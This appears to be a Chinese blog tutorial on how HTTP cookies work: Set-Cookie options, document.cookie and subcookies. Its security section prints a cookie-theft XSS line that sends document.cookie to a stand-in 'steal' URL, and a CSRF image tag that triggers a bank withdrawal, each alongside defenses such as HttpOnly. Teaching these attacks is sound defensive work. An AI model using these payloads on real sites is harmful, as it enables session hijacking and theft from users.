---
title: "HTTP Cookie 的原理与用法"
date: 2018-07-19T13:20:40+08:00
# draft: true
weight: 70
keywords: ["Cookie", "Browser API", "Web Storage", "HTTP", "浏览器 Cookie 用法"]
tags: ["HTTP", "BOM", "Notes"]
categories: ["技术分享"]
author: "Meowu"
# CJKLanguage: Chinese, Japanese, Korean 这样中文摘要才会生效
isCJKLanguage: true
thumbnail : "images/road.jpeg"
---


## 浏览器 Cookie

`cookie` 就是浏览器储存在用户电脑上的一小段文本文件。`cookie` 是纯文本格式，不包含任何可执行的代码。一个 Web 页面或服务器告知浏览器按照一定规范来储存这些信息，并在随后的请求中将这些信息发送至服务器，Web 服务器就可以使用这些信息来识别不同的用户。大多数需要登录的网站在用户验证成功之后都会设置一个 `cookie`，只要这个 `cookie` 存在并可以，用户就可以自由浏览这个网站的任意页面。

以下是我登录 `Github` 时响应体：

![Github_Cookies](/images/github_cookies.png)

Web 服务器通过发送一个称为 `Set-Cookie` 的 HTTP 消息头来创建一个 `cookie`，`Set-Cookie` 消息头是一个字符串，其格式如下（中括号中的部分是可选的）：

```shell
Set-Cookie: value; expires=date; path=path
```

`Set-Cookie` 指定的中括号里面的可选项只是给浏览器做记录的。当客户端发起请求，`value` 会被包含在 `HTTP` 报文的 `Cookie` 头中发送到服务器，设置项会被忽略。服务器端框架通常包含解析 `cookie` 的方法，可以通过编程的方式获取 cookie 的值。几乎所有的实现都对 cookie 的值进行了一系列的 URL 编码。对于 `name = value` 格式，通常会对 `name` 和 `value` 分别进行编码，而不对等号 `=` 进行编码操作。`name` 和 `value` 可以有若干个，其它选项分别有以下作用：

#### expires

指定了 `cookie` 何时不会再被发送至服务器，随后浏览器将删除该 `cookie`。没有设置该选项时，`cookie` 的生命周期仅限于当前会话中，关闭浏览器意味着这次会话的结束，所以会话 `cookie` 仅存在于浏览器打开状态之下。

#### domain

指定了 `cookie` 将要被发送至哪个或哪些域中。默认情况下，`domain` 会被设置为创建该 `cookie` 的页面所在的域名，所以当给相同域名发送请求时该 `cookie` 会被发送至服务器。`domain`  选项的值必须是发送 `Set-Cookie` 消息头的主机名（host）的一部分，例如我不能在 [google.com](http://google.com) 上设置一个 `cookie`，因为这会产生安全问题。不合法的 `domain` 选择将直接被忽略。

#### Path

`path` 选项指定了请求的资源 `URL` 中必须存在指定的路径时，才会发送 `Cookie`  消息头。这个比较通常是将 `path` 选项的值与请求的 URL **从头开始**逐字符比较完成的。只有在 `domain` 选项核实完毕之后才会对 `path` 属性进行比较。`path` 属性的默认值是发送 Set-Cookie 消息头所对应的 URL 中的 path 部分。所以上图中第二个 `Set-Cookie` 的名值对只有当请求的是 `github` 子域时才会发送。

#### secure

不像其它选项，该选项只是一个标记而没有值。只有当一个请求通过 `SSL` 或 `HTTPS` 创建时，包含 `secure` 选项的 `cookie` 才能被发送至服务器。这种 `cookie` 的内容具有很高的价值，如果以纯文本形式传递很有可能被篡改。事实上，机密且敏感的信息绝不应该在 `cookie` 中存储或传输，<u>因为 `cookie` 的整个机制原本都是不安全的</u>。默认情况下，在 HTTPS 链接上传输的 `cookie` 都会被自动添加上 secure 选项。

`cookie` 会被浏览器自动删除，通常存在以下几种原因：

1. 会话 `cooke (Session cookie)` 在会话结束时（浏览器关闭）会被删除。
2. 持久化 `cookie（Persistent cookie）` 在到达失效日期时会被删除
3. 如果浏览器中的 `cookie` 数量达到限制，那么 `cookie` 会被删除以为新建的 `cookie` 创建空间。

### 操作 Cookie

浏览器对于每个域下的 `Cookies` 数量和大小是有限制的，为了增加Cookies的储存量，提出了**subcookies:** `name=a=b&c=d&e=f&g=h` 这种方式允许在单个 cookie 中保存多个 name-value 对，而不会超出浏览器 cookie 数量的限制。通过这种方式创建 cookie 的负面影响是，需要**自定义解析方式**来提取这些值，相比较而言 `cookie` 的格式会更为简单。服务器端框架已开始支持 `subcookies` 的存储。

在 JavaScript 中通过 `document.cookie` 属性，你可以创建、维护和删除 cookie。**创建 cookie 时该属性等同于 Set-Cookie 消息头**，而在读取 cookie 时则等同于 Cookie 消息头。在创建一个 `cookie` 时，你需要使用和 `Set-Cookie` 期望格式相同的字符串：

```javascript
document.cookie="name=Nicholas;domain=nczonline.net;path=/";
```

要使用 `JavaScript` 提取 `cookie` 的值，只需要从 `document.cookie` 中读取即可， 它返回的是由分号 `;` 分隔的 `name = value` 字符串。。

**注意：一旦 cookie 通过 JavaScript 设置后便不能提取它的选项，所以你将不能知道 domain，path，expires 日期或 secure 标记。**

### 安全问题

#### 会话劫持

由于可以通过 `document.cookie` 来读取浏览器 `cookies` ，通过一些手段就能导致 `cookies` 被窃取：

```JavaScript
(new Image()).src = "http://www.example/steal?cookie=" + document.cookie
```

微软的 `IE6 SP1` 在 `cookie` 中引入了一个新的选项：`HTTP-only`，HTTP-Only 背后的意思是告之浏览器该 cookie 绝不能通过 JavaScript 的 document.cookie 属性访问。设计该特征意在提供一个安全措施来帮助阻止通过 JavaScript 发起的跨站脚本攻击 (XSS) 窃取 cookie 的行为。

```javascript
Set-Cookie: name=Nicholas; HttpOnly
```

一旦设定这个标记，通过 `documen.cookie`  则不能再访问该 `cookie` 。`IE`  同时更近一步并且不允许通过 `XMLHttpRequest` 的 `getAllResponseHeaders()` 或 `getResponseHeader()` 方法访问 `cookie`，然而其它浏览器则允许此行为。

#### CSRF

加载一张图片可能会导致给服务器发送一个提现的请求：

```JavaScript
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

当你打开含有了这张图片的HTML页面时，如果你之前已经登录了你的银行帐号并且Cookie仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：

- 对用户输入进行过滤来阻止[XSS](https://developer.mozilla.org/en-US/docs/Glossary/XSS)；
- 任何敏感操作都需要确认；
- 用于敏感信息的Cookie只能拥有较短的生命周期；

### 总结

**Cookie** 通常主要用于以下几个方面：

- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
- 个性化设置（如用户自定义设置、主题等）
- 浏览器行为跟踪（如跟踪分析用户行为等）

但是它也存在一些限制以及安全问题：

* 大小限制，通常最多 50 个，或者 4096 B 大小，超过的话会被清除以腾出空间
* 如果储存了大量 `cookies` ，会导致性能损失·
* 导致 XSS 和 CSRF 安全问题
* 隐私泄露

Cookie曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie渐渐被淘汰。由于服务器指定Cookie后，浏览器的每次请求都会携带Cookie数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器API已经允许开发者直接将数据存储到本地，如使用 [Web storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API) （本地存储和会话存储）或 [IndexedDB](https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API) 。·